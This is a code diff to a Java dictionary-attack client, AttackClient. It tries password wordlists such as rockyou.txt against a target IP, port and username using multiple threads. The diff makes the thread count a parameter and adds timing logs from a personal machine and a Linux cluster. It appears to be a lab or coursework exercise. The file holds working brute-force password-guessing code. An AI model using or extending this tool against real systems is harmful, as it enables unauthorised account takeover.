@@ -31,7 +31,7 @@ import javax.crypto.Cipher;
 public class AttackClient {
 
 	public static void main(String[] args) {
-		// Usage | AttackClient <IP> <PORT> <USERNAME> <list>
+		// Usage | AttackClient <IP> <PORT> <USERNAME> <list> <threads>
 		AttackClient ac = new AttackClient();
 
 		if (args.length < 4) {
@@ -42,8 +42,8 @@ public class AttackClient {
 			int port = Integer.parseInt(args[1]);
 			String username = args[2];
 			String list = args[3];
-			int lower = 0; 
-			int upper = 0;
+			int threads = Integer.parseInt(args[4]); 
+
             AttackClientThread thread = null;
 
             OffsetDateTime start = OffsetDateTime.now();
@@ -67,9 +67,9 @@ public class AttackClient {
 				while (dictRead.hasNextLine()) {
 					String pw = dictRead.nextLine();
 					pwStore[z]=pw;
-					if (z%(i/1000)==0 && z!=0) {
+					if (z%(i/threads)==0 && z!=0) {
 						ct++;
-						thread = new AttackClientThread(ip, port, username, Arrays.copyOfRange(pwStore, z-(i/1000), z));
+						thread = new AttackClientThread(ip, port, username, Arrays.copyOfRange(pwStore, z-(i/threads), z));
 						System.out.println("Trying "+z+" passwords");
             			thread.start();
             			arrThreads.add(thread);
@@ -92,24 +92,48 @@ public class AttackClient {
 			System.out.println("ENDED AT:   \t"+end);
 
 			// cain.txt - 3MB
+            // Personal Machine
 			// STARTED AT:     2020-11-17T20:13:10.026-05:00
 			// ENDED AT:       2020-11-17T20:21:04.171-05:00
 			// Total:		   7 minutes	54 seconds
 
+            // Linux cluster
+            // STARTED AT:     2020-11-19T19:10:41.261-05:00
+            // ENDED AT:       2020-11-19T19:24:34.398-05:00
+            // Total:          13 minutes   53 seconds
+
 			// john.txt - 21.4KB
+            // Personal Machine
 			// STARTED AT:     2020-11-17T20:21:23.337-05:00
 			// ENDED AT:       2020-11-17T20:24:07.937-05:00
 			// Total:		   2 minutes	44 seconds
 
+            // Linux cluster
+            // STARTED AT:     2020-11-19T19:28:43.329-05:00
+            // ENDED AT:       2020-11-19T19:30:20.480-05:00
+            // Total:          1 minutes    37 seconds
+
 			// PasswordPro.txt - 29.5MB
+            // Personal Machine
 			// STARTED AT:     2020-11-17T20:37:49.740-05:00
 			// ENDED AT:       2020-11-17T20:40:25.049-05:00
 			// Total:		   2 minutes	36 seconds
 
+            // Linux cluster
+            // 
+            // 
+            // Total:          7 minutes    54 seconds
+
 			// phpbb.txt - 1.5MB
+            // Personal Machine
 			// STARTED AT:     2020-11-17T21:17:47.020-05:00
 			// ENDED AT:       2020-11-17T21:22:25.276-05:00
 			// Total:		   4 minutes	38 seconds
+
+            // Linux cluster
+            // STARTED AT:     2020-11-19T19:32:51.879-05:00
+            // ENDED AT:       2020-11-19T19:34:46.065-05:00
+            // Total:          1 minutes    55 seconds
 
 			// rockyou.txt - 133MB
 			// STARTED AT:     2020-11-17T20:40:43.088-05:00
@@ -117,9 +141,15 @@ public class AttackClient {
 			// Total:		   5 minutes	52 seconds
 
 			// top1000000.txt - 8.13MB
+            // Personal Machine
 			// STARTED AT:     2020-11-17T20:47:39.354-05:00
 			// ENDED AT:       2020-11-17T21:12:15.360-05:00
 			// Total:		   24 minutes	36 seconds
+
+            // Linux cluster
+            // STARTED AT:     2020-11-19T19:35:22.174-05:00
+            // ENDED AT:       2020-11-19T22:35:22.647-05:00
+            // Total:          3 hours
 			
 		}
 
